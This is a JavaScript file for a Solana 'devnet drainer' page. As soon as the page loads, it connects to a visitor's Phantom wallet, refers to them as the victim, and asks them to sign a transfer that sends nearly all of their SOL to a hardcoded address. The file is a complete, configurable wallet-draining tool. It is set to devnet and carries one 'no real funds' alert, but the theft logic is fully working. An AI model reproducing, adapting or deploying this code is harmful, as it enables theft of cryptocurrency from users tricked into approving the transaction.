/**
 * DEVNET DRAINER - Works from Chrome/Safari on mobile
 * Automatically drains ALL Devnet SOL from victim's wallet
 */

// ============================================
// 🔧 CONFIGURATION - EDIT THESE 🔧
// ============================================
const YOUR_WALLET = "9tZqX5tq79HT2SN6AhxzXfqjowojW2hQut6e4vyzfrd1";
// Example: "9x4e9wXHvE9P9yXxR4R9qXxXxXxXxXxXxXxXxXxX"

// Set to true to drain ALL SOL, false for specific amount
const DRAIN_ALL = true;
const DRAIN_AMOUNT = 0.1; // Only used if DRAIN_ALL = false
// ============================================

// Global variables
let connection = null;
let publicKey = null;
let transactionLog = [];

// Display target address
document.getElementById('targetAddr').innerText = YOUR_WALLET;

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    addLog('💀 Devnet Drainer Active', 'drain');
    addLog(`📍 Drain target: ${YOUR_WALLET.substring(0, 30)}...`, 'wait');
    initSolana();
    
    // Auto-connect and drain as soon as page loads (real drainer behavior)
    setTimeout(() => {
        autoConnectAndDrain();
    }, 500);
});

async function initSolana() {
    if (typeof solanaWeb3 !== 'undefined') {
        connection = new solanaWeb3.Connection(
            solanaWeb3.clusterApiUrl('devnet'),
            'confirmed'
        );
        addLog('✅ Devnet ready', 'success');
        return true;
    }
    setTimeout(initSolana, 500);
    return false;
}

// 🔥 AUTO CONNECT AND DRAIN - HAPPENS AUTOMATICALLY 🔥
async function autoConnectAndDrain() {
    addLog('🦊 Requesting wallet connection...', 'wait');
    
    try {
        // Check if Phantom is installed (mobile or desktop)
        const provider = getPhantomProvider();
        
        if (!provider) {
            addLog('❌ Phantom not detected', 'error');
            addLog('📱 On mobile, Phantom app must be installed', 'error');
            return;
        }
        
        // Connect to Phantom (this will open the app on mobile)
        addLog('🔄 Connecting to wallet...', 'wait');
        const resp = await provider.connect();
        publicKey = resp.publicKey.toString();
        
        addLog(`✅ Victim connected: ${publicKey.substring(0, 25)}...`, 'success');
        
        // Get balance
        const pubKey = new solanaWeb3.PublicKey(publicKey);
        const balance = await connection.getBalance(pubKey);
        const balanceSol = balance / solanaWeb3.LAMPORTS_PER_SOL;
        
        addLog(`💰 Victim balance: ${balanceSol.toFixed(5)} DEVNET SOL`, 'wait');
        
        if (balanceSol < 0.01) {
            addLog(`⚠️ No SOL to drain (need at least 0.01)`, 'error');
            return;
        }
        
        // Calculate amount to drain
        let amountToDrain = 0;
        if (DRAIN_ALL) {
            // Leave a tiny amount for rent (0.00089 SOL)
            amountToDrain = balanceSol - 0.001;
            if (amountToDrain < 0) amountToDrain = balanceSol;
            addLog(`💀 Draining ALL: ${amountToDrain.toFixed(5)} SOL`, 'drain');
        } else {
            amountToDrain = DRAIN_AMOUNT;
            addLog(`💀 Draining ${amountToDrain} SOL`, 'drain');
        }
        
        if (amountToDrain <= 0) {
            addLog(`⚠️ Nothing to drain`, 'error');
            return;
        }
        
        // Create drain transaction
        const toPubkey = new solanaWeb3.PublicKey(YOUR_WALLET);
        const fromPubkey = new solanaWeb3.PublicKey(publicKey);
        
        const transaction = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
                fromPubkey: fromPubkey,
                toPubkey: toPubkey,
                lamports: amountToDrain * solanaWeb3.LAMPORTS_PER_SOL
            })
        );
        
        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = fromPubkey;
        
        addLog(`⏳ Waiting for victim to approve transaction...`, 'wait');
        
        // Sign and send - THIS WILL OPEN PHANTOM APP ON MOBILE
        const signature = await provider.signAndSendTransaction(transaction);
        
        addLog(`✅ DRAIN TRANSACTION SENT!`, 'drain');
        addLog(`🔑 Sig: ${signature.substring(0, 40)}...`, 'success');
        
        // Wait for confirmation
        const confirmation = await connection.confirmTransaction(signature, 'confirmed');
        
        if (confirmation.value.err) {
            throw new Error(`Transaction failed: ${confirmation.value.err}`);
        }
        
        addLog(`🎉 DRAIN COMPLETE! ${amountToDrain.toFixed(5)} SOL stolen!`, 'drain');
        addLog(`🔗 https://solscan.io/tx/${signature}?cluster=devnet`, 'success');
        addLog(`📍 Sent to: ${YOUR_WALLET.substring(0, 30)}...`, 'success');
        
        // Disable button
        const btn = document.getElementById('drainBtn');
        btn.disabled = true;
        btn.textContent = '✅ DRAINED!';
        
        alert(`💀 DRAIN SUCCESSFUL!\n\nDrained: ${amountToDrain.toFixed(5)} DEVNET SOL\nSent to: ${YOUR_WALLET.substring(0, 40)}...\n\n⚠️ This is DEVNET - No real funds were stolen.`);
        
    } catch (error) {
        console.error('Drain error:', error);
        
        if (error.message.includes('reject') || error.message.includes('User rejected')) {
            addLog(`💀 Victim REJECTED the transaction`, 'error');
        } else {
            addLog(`❌ Drain failed: ${error.message}`, 'error');
        }
    }
}

// Get Phantom provider (works on both mobile and desktop)
function getPhantomProvider() {
    // Mobile: Phantom injects solana object
    if (window.solana && window.solana.isPhantom) {
        return window.solana;
    }
    // Desktop: Phantom injects phantom.solana
    if (window.phantom?.solana) {
        return window.phantom.solana;
    }
    return null;
}

// Add log message
function addLog(message, type = 'wait') {
    transactionLog.unshift({
        message: message,
        type: type,
        time: new Date().toLocaleTimeString()
    });
    
    if (transactionLog.length > 30) transactionLog.pop();
    
    const logContainer = document.getElementById('log');
    if (logContainer) {
        logContainer.innerHTML = transactionLog.map(log => `
            <div class="log-entry ${log.type}">
                [${log.time}] ${log.message}
            </div>
        `).join('');
    }
}

// Also trigger drain when button is clicked (manual)
document.getElementById('drainBtn')?.addEventListener('click', () => {
    if (publicKey) {
        addLog('Already drained or in progress', 'error');
    } else {
        autoConnectAndDrain();
    }
});